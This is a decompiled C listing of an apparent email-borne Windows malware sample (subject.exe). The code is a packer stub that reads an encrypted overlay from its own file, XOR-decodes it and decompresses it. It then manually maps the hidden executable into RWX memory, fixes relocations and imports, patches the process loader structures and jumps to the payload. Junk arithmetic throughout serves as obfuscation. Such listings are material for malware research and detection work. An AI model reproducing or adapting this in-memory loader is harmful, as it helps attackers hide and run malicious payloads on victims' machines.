// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0762/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(Eq_5 dwArg04, Eq_5 dwArg08, Eq_5 dwArg0C)
{
	globals->dw404120 = 0x007B6A09;
	Eq_5 eax_12 = LoadIconA(0x00000000, 0x00404000);
	word32 eax_16 = 0x008C54E9 - globals->dw404110;
	if (eax_12 != 0x00000000)
	{
		globals->dw404104 = eax_16 - 0x00375DFC;
		globals->dw404120 = globals->dw404110 >> (byte) (0x005B8DBD - (eax_16 - 0x00375DFC));
	}
	fp->tFFFFFFD0 = eax_12;
	CopyIcon(0x00404000);
	globals->dw404104 = globals->dw404128 *s globals->dw404128 *s globals->dw404110;
	int32 dwLoc0C_36 = 0x00000000;
	while (dwLoc0C_36 < dwArg0C)
	{
		globals->dw40410C = dwLoc08 - 0x01524E1B >> (byte) globals->dw404134;
		dwArg04[dwLoc0C_36] = dwArg08[dwLoc0C_36];
		dwLoc0C_36 = dwLoc0C_36 + 0x00000001;
	}
	return;
}

word32 * fn004010D0(word32 * ebp, word32 dwArg04, word32 dwArg08, up32 dwArg0C)
{
	int32 eax_11 = 0x00696240 >> (byte) dwLoc38;
	globals->dw404108 = 0x0093B06B << (byte) eax_11;
	globals->dw404128 = eax_11 *s eax_11;
	globals->dw404104 = eax_11;
	globals->dw404104 = 0x0089DAB7 - globals->dw404128 + eax_11;
	IsRectEmpty(fp - 0x0000004C);
	globals->dw404120 = globals->dw404128 *s globals->dw404104 >> (byte) eax_11;
	if (dwArg0C <u 0x00000001)
		;
	else
	{
		byte cl_87 = *dwArg04;
		up32 dwLoc0C_100 = 0x00000001;
		word32 dwLoc1C_132 = 0x00000000;
		do
		{
			up32 ecx_108 = dwLoc0C_100 + 0x00000001;
			byte al_105 = dwArg04[dwLoc0C_100];
			dwLoc0C_100 = ecx_108;
			if ((word32) al_105 != (word32) cl_87)
			{
				dwArg08[dwLoc1C_132] = al_105;
				globals->dw40410C = dwLoc3C - 0x000DECF4 >> 0x0000006A;
				dwLoc1C_132 = dwLoc1C_132 + 0x00000001;
			}
			else if ((word32) dwArg04[ecx_108] == 0x00000000)
			{
				dwArg08[dwLoc1C_132] = cl_87;
				dwLoc1C_132 = dwLoc1C_132 + 0x00000001;
				dwLoc0C_100 = ecx_108 + 0x00000001;
			}
			else
			{
				word32 eax_197 = fn004012D0(fp - 0x00000014, dwArg04 + ecx_108) + ecx_108;
				globals->dw40410C = globals->dw404134 + 0x00085BB0;
				dwLoc0C_100 = fn004012D0(fp - 0x00000030, dwArg04 + eax_197) + eax_197;
				up32 dwLoc20_215 = 0x00000000;
				while (dwLoc20_215 <u dwLoc14)
				{
					dwArg08[dwLoc1C_132] = dwArg08[dwLoc1C_132 - dwLoc30];
					dwLoc1C_132 = dwLoc1C_132 + 0x00000001;
					dwLoc20_215 = dwLoc20_215 + 0x00000001;
				}
			}
		} while (dwLoc0C_100 <u dwArg0C);
	}
}

word32 fn004012D0(word32 dwArg04, word32 dwArg08)
{
	word32 dwLoc0C_12 = 0x00000000;
	word32 dwLoc24_13 = 0x00000000;
	do
	{
		word32 ecx_16 = (word32) dwArg08->b0000;
		globals->dw40410C = 0x00060209 << (byte) globals->dw404144;
		word32 ecx_30 = dwLoc0C_12 << 0x00000007 | ecx_16 & 0x0000007F;
		word32 ecx_38 = dwLoc24_13 + 0x00000001;
		dwArg08 = dwArg08 + 1;
		dwLoc0C_12 = ecx_30;
		dwLoc24_13 = ecx_38;
	} while ((ecx_16 & 0x00000080) != 0x00000000);
	*dwArg04 = ecx_30;
	return ecx_38;
}

word32 fn00401350(Eq_5 dwArg04)
{
	word32 eax_36;
	globals->dw404144 = globals->dw404134 >> 0xFFFFFFA7;
	word32 eax_27 = CreateFileA(dwArg04, 0x80000000, 0x00000001, 0x00000000, 0x00000003, 0x00000080, 0x00000000);
	globals->dw40410C = globals->dw404144 *s 0x000E06B3 + globals->dw404144;
	if (eax_27 == 0xFFFFFFFF)
		eax_36 = 0x00000000;
	else
		eax_36 = eax_27;
	return eax_36;
}

void fn004013B0(word32 dwArg04, byte bArg08, word32 dwArg0C)
{
	globals->dw40410C = RegisterHotKey;
	int32 dwLoc0C_10 = 0x00000000;
	while (dwLoc0C_10 < dwArg0C)
	{
		dwArg04[dwLoc0C_10] = bArg08;
		dwLoc0C_10 = dwLoc0C_10 + 0x00000001;
	}
	return;
}

void fn00401400(word32 ebx, word32 ebp, word32 esi, word32 edi, Eq_1026 * fs, word32 dwArg04, word32 dwArg08)
{
	globals->dw40410C = globals->dw40410C << (byte) (globals->dw404134 + 0x000AC8E3);
	globals->dw40410C = GetScrollBarInfo;
	globals->dw404144 = DestroyCursor;
	globals->dw40410C = dwLoc14 *s globals->dw404144 + dwLoc0C << 0x00000037;
	GetModuleHandleA(0x00000000);
	globals->dw404134 = dwLoc14 << (byte) dwLoc0C << 0xFFFFFFFB;
	LoadIconA(GetModuleHandleA(0x00000000), 0x00404028);
	LoadCursorA(0x00000000, 0x00007F00);
	int32 eax_70 = dwLoc18 *s globals->dw404144;
	int32 edx_79 = globals->dw40410C - globals->dw404134 *s globals->dw404144 >> (byte) globals->dw40410C;
	globals->dw40410C = 0x0000029F - globals->dw40410C;
	globals->dw40410C = 0x49FAC274 >> (byte) (dwLoc0C + 0x000A7275);
	RegisterClassA(&fp->tFFFFFF4C);
	if (dwArg08 != 0x00000001)
		globals->dw404130 = 0x00000000;
	else
	{
		globals->dw404130 = 0x00000001;
		globals->t404118 = dwArg04;
	}
	Eq_5 dwLoc2C_139;
	fp->dwFFFFFFDC = 0x00000000;
	Mem108[fp - 0x00000104:word32] = GetModuleHandleA(0x00000000);
	CreateWindowExA(0x00000000, 0x00404074, 0x00404054, 0x00000001, 0x00156626, 0x00096474, 0x00007457, 0x01673248, 0x00000000, 0x00000000, null, 0x00000000);
	globals->dw40410C = GetMessageW;
	globals->dw404144 = 0x00000000;
	if (globals->dw404130 == 0x00000000)
	{
		fp->dwFFFFFFDC = 0x00000000;
		dwLoc2C_139 = GetModuleHandleA(0x00000000);
	}
	else
		dwLoc2C_139 = dwArg04;
	globals->dw404120 = globals->dw404104 - 0x0018C982;
	fp->dwFFFFFFDC = 0x0040409C;
	if ((word32) (word16) AddAtomA(null) == 0x00000000)
	{
		globals->dw404110 = globals->dw404108 << (byte) (dwLoc24 + globals->dw404104);
		dwLoc24 = 0x003454BD;
	}
	fp->dwFFFFFFDC = 0x003454BD;
	globals->dw404134 = GetNextDlgTabItem;
	globals->dw404134 = edx_79 >> (byte) (dwLoc0C + 0x000D6E97);
	word32 edx_170 = dwLoc2C_139 + Mem167[dwLoc2C_139 + 0x0000003C:word32];
	fp->dwFFFFFFDC = 0x00000044;
	fp->dwFFFFFFDC = fp - 0x00000074;
	fn004013B0(0x00000000, 0x00, 0x00000000);
	globals->dw40410C = 0x00154CFC >> (byte) (edx_79 *s 0x00021F98);
	Mem192[fp - 0x00000100:word32] = fp - 0x00000074;
	GetStartupInfoA(&globals->t40409C);
	globals->dw404134 = EnumDisplaySettingsExW;
	if (true)
	{
l00401CB9:
		return;
	}
	else
	{
		int32 edx_299 = globals->dw404144 >> (byte) (globals->dw404144 + eax_70);
		fp->dwFFFFFFDC = globals->dw404104;
		globals->dw404128 = 0x003454BD - globals->dw404128;
		globals->dw404110 = 0x003454BD;
		fp->dwFFFFFFDC = globals->dw404128 + 0x00570110;
		globals->dw404110 = 0x00000000;
		fp->dwFFFFFFDC = &fp->tFFFFFF00;
		CopyRect(0x00000000, &fp->tFFFFFF38);
		fp->dwFFFFFFDC = globals->dw404104 + 0x00216E08;
		globals->dw404134 = globals->dw404134 - 0x0002F23C;
		globals->dw404144 = CharUpperBuffA;
		Eq_612 * edx_342 = ((word32) edx_170->w0006 - 0x00000001) *s 0x00000028 + (&edx_170->w0014 + (word32) edx_170->w0014);
		word32 eax_348 = edx_342->dw0010 - 0x00000001 + edx_170->t003C;
		Eq_639 eax_358 = SEQ(SEQ(0x00000000, eax_348) % edx_170->t003C, eax_348) /u edx_170->t003C *s edx_170->t003C + edx_342->dw0014;
		globals->dw40410C = GetIconInfo;
		Eq_5 eax_365 = fn00402730(0x00000200);
		if (eax_365 == 0x00000000)
			goto l00401CB9;
		else
		{
			globals->dw404144 = CharUpperBuffA;
			fp->dwFFFFFFDC = 0x00000200;
			GetModuleFileNameA(dwLoc2C_139, eax_365, 0x00000200);
			globals->dw404128 = globals->dw404120 - globals->dw404128;
			fp->dwFFFFFFDC = 0x004040B4;
			Eq_5 eax_392 = LoadCursorA(0x00000000, 0x00000200);
			if (eax_392 != 0x00000000)
			{
				globals->dw404110 = dwLoc24 - globals->dw404110 << (byte) globals->dw404110;
				Mem773[fp - 0x00000100:word32] = eax_392;
				SetCursor(&globals->t4040B4);
				globals->dw404104 = dwLoc24 >> (byte) dwLoc24;
			}
			int32 eax_398 = globals->dw404110;
			globals->dw404144 = eax_70 + 0x000C9B1D;
			Eq_5 eax_407 = fn00401350(eax_365);
			if (eax_407 == 0x00000000)
				goto l00401CB9;
			else
			{
				globals->dw404144 = 0x00000000;
				globals->dw404134 = SetWindowRgn;
				Mem422[fp - 0x00000104:word32] = eax_407;
				Eq_751 eax_425 = GetFileSize(0x00000000, 0x00000000) - eax_358;
				globals->dw404134 = AppendMenuA;
				if (eax_425 == 0x00000000)
					goto l00401CB9;
				else
				{
					fp->dwFFFFFFDC = eax_425.u0;
					Eq_5 eax_439 = fn00402730(0x00000000);
					if (eax_439 == 0x00000000)
						goto l00401CB9;
					else
					{
						ui32 edx_454 = globals->dw40410C << (byte) (edx_299 >> 0xFFFFFFB5) << (byte) (globals->dw40410C + edx_79);
						Mem465[fp - 0x0000010C:word32] = eax_407;
						SetFilePointer(0x00000000, eax_358, 0x00000000, 0x00000000);
						Mem478[fp - 0x0000010C:word32] = eax_439;
						Mem481[fp - 0x00000110:word32] = eax_407;
						if (ReadFile(0x01673248, 0x00000000, eax_425, fp - 0x0000007C, 0x00000000) == 0x00000000)
							goto l00401CB9;
						else if (dwLoc7C != eax_425)
							goto l00401CB9;
						else
						{
							globals->dw40410C = GetCursor;
							Mem505[fp - 0x00000100:word32] = eax_407;
							CloseHandle(0x00000000);
							globals->dw404144 = ChangeDisplaySettingsA;
							if (dwLoc7C != eax_425)
								goto l00401CB9;
							else
							{
								globals->dw404144 = SubtractRect;
								fn00401000(eax_439, eax_439 - 0x00000040 + eax_425, 0x00000040);
								globals->dw404134 = GetScrollBarInfo;
								globals->dw404128 = globals->dw404104 *s globals->dw404120 << (byte) eax_398;
								Eq_5 eax_541 = LoadIconA(0x00000000, 0x004040C8);
								int32 edx_548 = globals->dw404108 >> 0xFFFFFF97 >> (byte) eax_398;
								if (eax_541 != 0x00000000)
								{
									globals->dw404110 = globals->dw404120 + 0x0097E14C;
									globals->dw404128 = globals->dw404128 >> 0x00000006;
								}
								globals->dw404110 = edx_548;
								Mem557[fp - 0x00000100:word32] = eax_541;
								CopyIcon(0x004040C8);
								word32 eax_565 = Mem557[eax_439 + 0x00000000:word32];
								globals->dw404134 = CallNextHookEx;
								fp->dwFFFFFFDC = 0x004040EC;
								word16 ax_575 = (word16) AddAtomA(&globals->t4040C8);
								int32 dwLoc24_571 = edx_548 >> 0xFFFFFFD7;
								if ((word32) ax_575 == 0x00000000)
									dwLoc24_571 = globals->dw404128 >> 0xFFFFFFB5 << (byte) globals->dw404104;
								globals->dw404128 = dwLoc24_571 *s 0x00542059;
								word32 edx_589 = Mem587[eax_439 + 0x00000004:word32];
								up32 dwLoc10_591 = 0x00000000;
								while (dwLoc10_591 <u eax_565)
								{
									(eax_439 + dwLoc10_591)->dw0008 = (eax_439 + dwLoc10_591)->dw0008 ^ 0x00000457;
									globals->dw40410C = 0x00081222 - edx_454 >> 0x0000007F;
									dwLoc10_591 = dwLoc10_591 + 0x00000008;
								}
								Mem616[fp - 0x00000100:word32] = edx_589;
								globals->t40412C = fn00402730(0x004040C8);
								if (globals->t40412C == 0x00000000)
									ExitProcess(0x00881428);
								word32 esp_677;
								Mem627[fp - 0x00000104:word32] = Mem619[0x0040412C:word32];
								word32 ebp_633 = fn004010D0(fp - 0x00000004, eax_439 + 0x00000008, 0x00000000, eax_565);
								fp->dwFFFFFFDC = 0x00401C12;
								globals->dw404134 = 0x0009B76B - globals->dw404144 *s 0x0001BC2C << 0xFFFFFFD8;
								ebp_633->dwFFFFFFF8 = fp->dwFFFFFFDC;
								ebp_633->dwFFFFFFF8 = 0x00040A05;
								globals->ptr40413C = fs->ptr0018;
								globals->dw404134 = 0x00084F2B << (byte) (ebp_633->dwFFFFFFF8 *s 0x0002918E);
								globals->dw404114 = edi;
								globals->dw404100 = esi;
								globals->dw404124 = ebx;
								ebp_633->dwFFFFFFF8 = ebp_633->dwFFFFFFF8 + globals->dw40410C;
								globals->ptr40411C = ebp_633;
								globals->dw404134 = 0x000AAA7D << (byte) globals->dw404144 << (byte) (0x0007A476 - globals->dw40410C);
								if (globals->dw404130 != 0x00000000)
								{
									Mem730[fp - 0x00000100:word32] = Mem672[ebp_633 - 0x0000000C:word32] - Mem672[0x00404118:word32];
									fn00401CD0(dwArg00);
									esp_677 = fp - 0x000000FC;
								}
								else
								{
									fp->dwFFFFFFDC = 0x00000000;
									Mem741[fp - 0x00000100:word32] = Mem734[ebp_633 - 0x0000000C:word32] - GetModuleHandleA(fp->dwFFFFFFDC);
									fn00401CD0(dwArg00);
									esp_677 = fp - 0x000000FC;
								}
								Eq_5 * esp_679 = esp_677 - 0x00000004;
								Mem680[esp_679 + 0x00000000:word32] = Mem672[0x0040412C:word32];
								if (fn00401F70(dwArg00) == 0x00000000)
								{
									Mem720[esp_679 + 0x00000000:word32] = Mem680[0x0040412C:word32];
									fn004026E0(dwArg00);
									Mem724[esp_679 + 0x00000000:word32] = 0x00000145;
									ExitProcess(Mem724[esp_679 + 0x00000000:UINT]);
								}
								ebp_633->dwFFFFFFF8 = ebp_633->dwFFFFFFF8 + 0x000A16E8 - globals->dw40410C - ebp_633->dwFFFFFFF8;
								ebp_633->dwFFFFFFF8 = ebp_633->dwFFFFFFF8 << (byte) globals->dw404134;
								globals->dw40410C = 0x000EFD58 << (byte) ((ebp_633->dwFFFFFFF8 - ebp_633->dwFFFFFFF8) - 0x00041C7F);
								int32 ecx_709 = ebp_633->dwFFFFFFF8;
								byte cl_710 = (byte) ecx_709;
								int32 edx_711 = ebp_633->dwFFFFFFF8 << cl_710;
								ebp_633->dwFFFFFFF8 = edx_711;
								int32 eax_715 = ebp_633->dwFFFFFFF8 + ebp_633->dwFFFFFFF8;
								ebp_633->dwFFFFFFF8 = eax_715;
								Mem717[0x00404140:word32]();
								return;
							}
						}
					}
				}
			}
		}
	}
}

void fn00401CD0(word32 dwArg04)
{
fn00401CD0_entry:
l00401CD0:
	Eq_5 dwLoc40_16
	globals->dw40410C = GetWindowTextA;
	globals->dw404144 = LoadBitmapA;
	branch globals->dw404130 == 0x00000000 l00401D01
l00401CF6:
	dwLoc40_16 = globals->t404118;
	goto l00401D0C
l00401D01:
	&*dwLoc48.u0 = 0x00000000;
	dwLoc40_16 = GetModuleHandleA(0x00000000);
l00401D0C:
	branch dwLoc40_16 != 0x00000000 l00401D19
l00401D12:
	goto l00401EDF
l00401D19:
	globals->dw404134 = SetDlgItemTextW;
	word32 ecx_60 = dwLoc40_16 + Mem50[dwLoc40_16 + 0x0000003C:word32]
	fp->tFFFFFFB8.u0 = 0x00000040;
	globals->t404138 = VirtualAlloc(0x00000000, ecx_60->t0050, 0x00003000, null);
	branch globals->t404138 != 0x00000000 l00401D6F
l00401D68:
	goto l00401EDF
l00401D6F:
	globals->dw404144 = dwLoc10 - 0x000B4EA3 - dwLoc30;
	fp->tFFFFFFB8 = ecx_60->t0050;
	Mem92[fp - 0x0000004C:word32] = dwLoc40_16
	fn00401000(globals->t404138, 0x00003000, dwLoc48)
	word32 eax_98 = globals->t404138 - dwLoc40_16
	branch ecx_60->dw00A4 == 0x00000000 l00401ECD
l00401DB6:
	Eq_1308 * dwLoc14_133 = dwLoc40_16 + Mem92[ecx_60 + 0x000000A0:word32]
l00401DC5:
	branch dwLoc14_133->dw0004 == 0x00000000 l00401ECD
l00401DD2:
	uint32 ecx_159 = dwLoc14_133->dw0004 - 0x00000008 >>u 0x00000001
	globals->dw404134 = dwLoc08 + 0xFFF29CBC + ((0x0007274B << (byte) globals->dw404144) >> (byte) globals->dw40410C) << (byte) globals->dw404144;
	globals->dw40410C = globals->dw40410C *s 0x0009BEEE + globals->dw404144;
	word16 * eax_170[] = &dwLoc14_133->a0008[0]
	uint32 dwLoc0C_177 = 0x00000000
	goto l00401E46
l00401E3D:
	dwLoc0C_177 = dwLoc0C_177 + 0x00000001;
l00401E46:
	branch dwLoc0C_177 >=u ecx_159 l00401EBC
l00401E4E:
	branch (word32) eax_170[dwLoc0C_177] >> 0x0000000C != 0x00000003 l00401EBA
l00401E7B:
	(Mem176[0x00404138:word32] + Mem176[dwLoc14_133 + 0x00000000:word32])[(word32) eax_170[dwLoc0C_177] & 0x00000FFF] = (Mem176[0x00404138:word32] + Mem176[dwLoc14_133 + 0x00000000:word32])[(word32) eax_170[dwLoc0C_177] & 0x00000FFF] + eax_98;
l00401EBA:
	goto l00401E3D
l00401EBC:
	dwLoc14_133 = dwLoc14_133 + Mem176[dwLoc14_133 + 0x00000004:word32];
	goto l00401DC5
l00401ECD:
l00401EDF:
	return
fn00401CD0_exit:
}

word32 fn00401F70(word32 dwArg04)
{
	word32 eax_283;
	word32 edx_16 = dwArg04 + Mem0[dwArg04 + 0x0000003C:word32];
	Eq_1411 * dwLoc2C_123 = &edx_16->w0014 + (word32) edx_16->w0014;
	Eq_5 eax_33 = VirtualAlloc(0x00000000, edx_16->t0050, 0x00003000, 0x00000040);
	if (eax_33 == 0x00000000)
		eax_283 = 0x00000000;
	else
	{
		Mem107[fp - 0x00000058:word32] = Mem0[dwArg04 + 0x0000003C:word32] + 0x00000138 + (word32) Mem0[edx_16 + 0x00000006:word16] *s 0x00000028;
		Mem110[fp - 0x0000005C:word32] = dwArg04;
		fn00401000(eax_33, 0x00003000, 0x00000040);
		up32 dwLoc10_116 = 0x00000000;
		while (dwLoc10_116 <u (word32) edx_16->w0006)
		{
			globals->dw40410C = 0x00000000 << (byte) (dwLoc24 - globals->dw404144);
			if (dwLoc2C_123->dw0014 != 0x00000000 && dwLoc2C_123->dw0010 != 0x00000000)
			{
				word32 eax_165 = dwLoc2C_123->dw0010 - 0x00000001 + edx_16->t003C;
				fn00401000(eax_33 + Mem137[dwLoc2C_123 + 0x0000000C:word32], dwArg04 + Mem137[dwLoc2C_123 + 0x00000014:word32], SEQ(SEQ(0x00000000, eax_165) % edx_16->t003C, eax_165) /u edx_16->t003C *s edx_16->t003C);
			}
			globals->dw40410C = 0x00000000;
			dwLoc2C_123 = dwLoc2C_123 + 1;
			dwLoc10_116 = dwLoc10_116 + 0x00000001;
		}
		word32 ecx_193 = eax_33 + Mem110[eax_33 + 0x0000003C:word32];
		Eq_1466 * dwLoc50_199 = eax_33 + Mem110[ecx_193 + 0x00000080:word32];
		while (dwLoc50_199->dw0010 != 0x00000000)
		{
			Eq_5 eax_224 = GetModuleHandleA(eax_33 + Mem110[dwLoc50_199 + 0x0000000C:word32]);
			Eq_5 dwLoc18_226 = eax_224;
			if (eax_224 == 0x00000000)
			{
				if (globals->dw404130 != 0x00000000)
				{
					eax_283 = 0x00000000;
					goto l00402570;
				}
				Eq_5 eax_361 = LoadLibraryA(eax_33 + Mem110[dwLoc50_199 + 0x0000000C:word32]);
				dwLoc18_226 = eax_361;
				dwLoc24 = globals->dw404144 *s 0x000C020C;
				if (eax_361 == 0x00000000)
				{
					eax_283 = 0x00000000;
					goto l00402570;
				}
				goto l00402113;
			}
l00402113:
			Eq_1544 * dwLoc3C_244;
			Eq_1545 * dwLoc28_243;
			globals->dw40410C = globals->dw40410C << 0x00000035 << (byte) (globals->dw404144 - dwLoc24);
			if (dwLoc50_199->dw0000 != 0x00000000)
			{
				dwLoc28_243 = eax_33 + Mem239[dwLoc50_199 + 0x00000000:word32];
				dwLoc3C_244 = eax_33 + Mem239[dwLoc50_199 + 0x00000010:word32];
			}
			else
			{
				dwLoc28_243 = eax_33 + Mem239[dwLoc50_199 + 0x00000010:word32];
				dwLoc3C_244 = eax_33 + Mem239[dwLoc50_199 + 0x00000000:word32];
			}
			if (dwLoc50_199->dw0010 != 0x00000000 && dwLoc50_199->dw0000 != 0x00000000)
			{
				fp->dwFFFFFFEC = 0x00000001;
				goto l00402184;
			}
l00402184:
			while (dwLoc28_243->dw0000 != 0x00000000)
			{
				dwLoc08 = dwLoc24 + 0x0004D8F7;
				if ((dwLoc28_243->dw0000 & 0x80000000) != 0x00000000)
					dwLoc28_243->dw0000 = GetProcAddress(dwLoc18_226, dwLoc28_243->dw0000 & 0x7FFFFFFF);
				else
					dwLoc28_243->dw0000 = GetProcAddress(dwLoc18_226, dwLoc28_243->dw0000 + 0x00000002 + eax_33);
				if (dwLoc28_243->dw0000 == 0x00000000)
				{
					eax_283 = 0x00000000;
					goto l00402570;
				}
				if (0x00000000 != 0x00000000)
					dwLoc3C_244->dw0000 = dwLoc28_243->dw0000;
				dwLoc28_243 = dwLoc28_243 + 1;
				dwLoc3C_244 = dwLoc3C_244 + 1;
			}
			dwLoc50_199 = dwLoc50_199 + 1;
		}
		if (globals->dw404130 != 0x00000000)
		{
			word32 ecx_683 = globals->t404118 - ecx_193->t0034;
			if (ecx_193->dw00A4 != 0x00000000)
			{
				Eq_1641 * dwLoc1C_692 = eax_33 + Mem110[ecx_193 + 0x000000A0:word32];
				while (dwLoc1C_692->dw0004 != 0x00000000)
				{
					uint32 ecx_707 = dwLoc1C_692->dw0004 - 0x00000008 >>u 0x00000001;
					word16 * edx_710[] = &dwLoc1C_692->a0008[0];
					uint32 dwLoc10_713 = 0x00000000;
					while (dwLoc10_713 <u ecx_707)
					{
						globals->dw404144 = dwLoc08 - 0x0000EEE5;
						if ((word32) edx_710[dwLoc10_713] >> 0x0000000C == 0x00000003)
							(eax_33 + Mem724[dwLoc1C_692 + 0x00000000:word32])[(word32) edx_710[dwLoc10_713] & 0x00000FFF] = (eax_33 + Mem724[dwLoc1C_692 + 0x00000000:word32])[(word32) edx_710[dwLoc10_713] & 0x00000FFF] + ecx_683;
						dwLoc10_713 = dwLoc10_713 + 0x00000001;
					}
					dwLoc1C_692 = dwLoc1C_692 + Mem110[dwLoc1C_692 + 0x00000004:word32];
				}
			}
		}
		Eq_5 eax_390 = ecx_193->t0050;
		fp->dwFFFFFFEC = 0x00000004;
		Eq_1612 eax_401 = CreateFileMappingA(0xFFFFFFFF, 0x00000000, 0x00000000, 0x00000000, eax_390, 0x00000000);
		if (eax_401 == 0x00000000)
			eax_283 = 0x00000000;
		else
		{
			if (globals->dw404130 != 0x00000000)
			{
				Mem648[fp - 0x00000058:word32] = Mem396[0x00404118:word32];
				fp->dwFFFFFFEC = 0x00000000;
				fp->dwFFFFFFEC = 0x00000000;
				fp->dwFFFFFFEC = 0x00000022;
				fp->dwFFFFFFEC = eax_401.u0;
				globals->t404138 = MapViewOfFileEx(0xFFFFFFFF, 0x00000000, (Eq_2227 *) 0x00000004, 0x00000000, 0x00000000, null);
			}
			else
			{
				Mem666[fp - 0x00000058:word32] = Mem396[ecx_193 + 0x00000034:word32];
				fp->dwFFFFFFEC = 0x00000000;
				fp->dwFFFFFFEC = 0x00000000;
				fp->dwFFFFFFEC = 0x00000022;
				fp->dwFFFFFFEC = eax_401.u0;
				globals->t404138 = MapViewOfFileEx(0xFFFFFFFF, 0x00000000, (Eq_2227 *) 0x00000004, 0x00000000, 0x00000000, 0x00000000);
			}
			if (globals->t404138 != 0x00000000)
				goto l004024BC;
			else if (globals->dw404130 == 0x00000000)
				if (UnmapViewOfFile(ecx_193->t0034) == 0x00000000)
				{
					fp->dwFFFFFFEC = 0x00000000;
					Mem636[fp - 0x00000060:word32] = Mem632[ecx_193 + 0x00000034:word32];
					if (VirtualFree(null, 0x00000000, 0x00008000) == 0x00000000)
						eax_283 = 0x00000000;
					else
						goto l00402411;
				}
				else
					goto l00402411;
			else if (UnmapViewOfFile(globals->t404118) == 0x00000000)
			{
				fp->dwFFFFFFEC = 0x00000000;
				Mem610[fp - 0x00000060:word32] = Mem607[0x00404118:word32];
				if (VirtualFree(null, 0x00000000, 0x00008000) == 0x00000000)
					eax_283 = 0x00000000;
				else
				{
l004023DF:
l00402411:
					if (globals->dw404130 != 0x00000000)
					{
						Eq_5 ecx_554 = globals->t404118;
						fp->dwFFFFFFEC = 0x00000000;
						fp->dwFFFFFFEC = 0x00000000;
						fp->dwFFFFFFEC = 0x00000022;
						globals->t404138 = MapViewOfFileEx(eax_401, 0x00000022, null, 0x00000000, 0x00000000, ecx_554);
					}
					else
					{
						Eq_5 ecx_572 = ecx_193->t0034;
						fp->dwFFFFFFEC = 0x00000000;
						fp->dwFFFFFFEC = 0x00000000;
						fp->dwFFFFFFEC = 0x00000022;
						globals->t404138 = MapViewOfFileEx(eax_401, 0x00000022, null, 0x00000000, 0x00000000, ecx_572);
					}
					if (globals->t404138 != 0x00000000)
						goto l004024BC;
					else
					{
						if (globals->dw404130 != 0x00000000)
						{
							fp->dwFFFFFFEC = 0x00003000;
							Mem532[fp - 0x00000060:word32] = Mem528[ecx_193 + 0x00000050:word32];
							Mem535[fp - 0x00000064:word32] = Mem532[0x00404118:word32];
							globals->t404138 = VirtualAlloc(null, 0x00000000, null, 0x00000040);
						}
						else
						{
							fp->dwFFFFFFEC = 0x00003000;
							Mem546[fp - 0x00000060:word32] = Mem542[ecx_193 + 0x00000050:word32];
							Mem550[fp - 0x00000064:word32] = Mem546[ecx_193 + 0x00000034:word32];
							globals->t404138 = VirtualAlloc(null, 0x00000000, null, 0x00000040);
						}
						if (globals->t404138 == 0x00000000)
							eax_283 = 0x00000000;
						else
						{
l004024BC:
							fn00401000(globals->t404138, eax_33, ecx_193->t0050);
							if (globals->dw404130 != 0x00000000)
								fn00402580(globals->t404118, Mem396[0x00404138:word32] + Mem396[ecx_193 + 0x00000028:word32]);
							else
								fn00402650(globals->t404138);
							globals->dw404144 = 0x0004BE07 >> (byte) (dwLoc08 *s 0x000C531C) << (byte) dwLoc08;
							Mem458[0x00404140:word32] = Mem454[0x00404138:word32] + Mem454[ecx_193 + 0x00000028:word32];
							ecx_193->ptr0028 = globals->ptr404140;
							globals->dw40410C = dwLoc08 *s 0x000A35E6 << (byte) (globals->dw404144 *s 0x0004BE07);
							eax_283 = 0x00000001;
						}
					}
				}
			}
			else
				goto l004023DF;
		}
	}
l00402570:
	return eax_283;
}

void fn00402580(Eq_5 dwArg04, word32 dwArg08)
{
	Eq_2072 * eax_11 = globals->ptr40413C->ptr0030->ptr000C;
	globals->dw404144 = dwLoc1C *s globals->dw404144 + globals->dw404144;
	Eq_2090 * edx_19 = eax_11->ptr000C;
	word32 dwLoc08_31 = 0x00000000;
	Eq_2090 * dwLoc18_20 = edx_19;
	while (0x00000001 != 0x00000000)
	{
		globals->dw404144 = globals->dw404144 + dwLoc08_31;
		if (dwLoc18_20 == null)
			goto l00402649;
		if (dwLoc18_20->dw0018 == dwArg04)
		{
			dwLoc18_20->dw001C = dwArg08;
			goto l00402649;
		}
		Eq_2090 * eax_79 = dwLoc18_20->ptr0000;
		dwLoc08_31 = globals->dw404134 - 0x00065F42 - globals->dw404144;
		dwLoc18_20 = eax_79;
		if (eax_79 == edx_19)
			goto l00402649;
	}
l00402649:
	return;
}

void fn00402650(Eq_5 dwArg04)
{
	globals->dw404134 = 0x00036C11 >> (byte) (globals->dw40410C - 0x000233DC);
	Eq_1028 * ecx_14 = globals->ptr40413C;
	Eq_2077 * eax_26 = ecx_14->ptr0030;
	globals->dw404134 = globals->dw404144 << (byte) (globals->dw404144 *s globals->dw404134) >> 0xFFFFFFBA;
	eax_26->dw0008 = dwArg04;
	globals->dw40410C = 0x0007392C - globals->dw404144 >> 0xFFFFFFF2;
	return;
}

void fn004026E0(word32 dwArg04)
{
	globals->dw404134 = 0x000C1E4D >> (byte) (globals->dw40410C + globals->dw404144);
	HeapFree(GetProcessHeap(), 0x00000000, dwArg04);
	return;
}

word32 fn00402730(word32 dwArg04)
{
	globals->dw404134 = globals->dw40410C *s 0x0000B84C *s globals->dw404134 + 0x00038CBB;
	word32 eax_23 = HeapAlloc(GetProcessHeap(), 0x00000000, dwArg04);
	globals->dw404144 = dwLoc10 >> (byte) (dwLoc10 *s dwLoc10 + 0x00083B9E);
	return eax_23;
}

